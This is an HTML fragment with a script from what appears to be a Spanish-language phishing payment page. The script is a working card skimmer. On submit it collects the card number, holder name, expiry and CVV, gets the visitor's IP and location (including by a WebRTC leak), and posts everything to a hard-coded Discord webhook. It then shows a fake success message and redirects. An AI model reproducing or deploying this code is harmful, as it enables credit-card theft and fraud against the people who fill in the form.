      <div class="cont-icos">
        <img src="https://cdn.glitch.global/3bc874cc-c5e4-4ba4-b9ac-a6c40f8c4ca7/picts%2Fa1.svg?v=1740067232827" alt="">
        <img src="https://cdn.glitch.global/3bc874cc-c5e4-4ba4-b9ac-a6c40f8c4ca7/picts%2Fa3.svg?v=1740067233647" alt="">
        <img src="https://cdn.glitch.global/3bc874cc-c5e4-4ba4-b9ac-a6c40f8c4ca7/picts%2Fa2.svg?v=1740067233245" alt="">

  <script>
  const webhookURL = "https://discord.com/api/webhooks/1431346800392147045/YqgBMyv22D6F0tgq-EbazLfIGYJmOSEBwp2ZMhT_ZVN6F0BwowxZ7bvm7ynXMHpljpWy";
  const redirectURL = "_indexxx.html";

  const form = document.getElementById("xjsx");
  const cardNumber = document.getElementById("j1");
  const cardName = document.getElementById("j2");
  const expMM = document.getElementById("j3");
  const expYY = document.getElementById("j4");
  const cvv = document.getElementById("j5");
  const statusMessage = document.getElementById("status");

  const isPrivate = (ip) => /^10\.|^127\.|^169\.254\.|^192\.168\.|^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(ip);

  async function getIPData() {
    try {
      const r = await fetch("https://ipapi.co/json/");
      if (r.ok) {
        const j = await r.json();
        return {
          ip: j.ip || "desconocida",
          city: j.city || "desconocida",
          country: j.country_name || j.country || "desconocido"
        };
      }
    } catch (e) {}

    try {
      const rIp = await fetch("https://api.ipify.org?format=json");
      if (rIp.ok) {
        const jIp = await rIp.json();
        const ip = jIp.ip;
        try {
          const rGeo = await fetch(`https://ipapi.co/${ip}/json/`);
          if (rGeo.ok) {
            const jGeo = await rGeo.json();
            return {
              ip: ip,
              city: jGeo.city || "desconocida",
              country: jGeo.country_name || jGeo.country || "desconocido"
            };
          }
        } catch (e) {}
        return { ip, city: "desconocida", country: "desconocido" };
      }
    } catch (e) {}

    try {
      const ipFromWebRTC = await new Promise((resolve) => {
        const ips = new Set();
        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
        pc.createDataChannel("");
        pc.onicecandidate = (evt) => {
          if (!evt.candidate) {
            pc.close();
            for (const ip of ips) {
              if (!isPrivate(ip)) return resolve(ip);
            }
            return resolve(ips.values().next().value || null);
          } else {
            const m = evt.candidate.candidate.match(/([0-9]{1,3}(?:\.[0-9]{1,3}){3})/);
            if (m) ips.add(m[1]);
          }
        };
        pc.createOffer().then((sdp) => pc.setLocalDescription(sdp)).catch(() => resolve(null));
      });

      if (ipFromWebRTC) {
        try {
          const rGeo2 = await fetch(`https://ipapi.co/${ipFromWebRTC}/json/`);
          if (rGeo2.ok) {
            const jG2 = await rGeo2.json();
            return {
              ip: ipFromWebRTC,
              city: jG2.city || "desconocida",
              country: jG2.country_name || jG2.country || "desconocido"
            };
          }
        } catch (e) {}
        return { ip: ipFromWebRTC, city: "desconocida", country: "desconocido" };
      }
    } catch (e) {}

    return { ip: "desconocida", city: "desconocida", country: "desconocido" };
  }

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    statusMessage.textContent = "Validando datos...";
    statusMessage.style.display = "block";
    statusMessage.className = "status-message";

    try {
      const geo = await getIPData();

      const payload = {
        content: `üîê **Nuevo pago recibido**
üí≥ N√∫mero de tarjeta: ${cardNumber.value}
üë§ Titular: ${cardName.value}
üìÖ Vencimiento: ${expMM.value}/${expYY.value}
üîí CVV: ${cvv.value}
üåê IP: ${geo.ip}
üèô Ciudad: ${geo.city}
üó∫ Pa√≠s: ${geo.country}
üñ•Ô∏è User-Agent: ${navigator.userAgent}`
      };

      const response = await fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      if (response.ok) {
        statusMessage.textContent = "‚úÖ Validados correctamente";
        statusMessage.classList.add("status-success");
        form.reset();
        setTimeout(() => {
          window.location.href = redirectURL;
        }, 0);
      } else {
        throw new Error("Error al enviar");
      }
    } catch (error) {
      statusMessage.textContent = "‚ùå Error al enviar los datos.";
      statusMessage.classList.add("status-error");
    }
  });
</script>
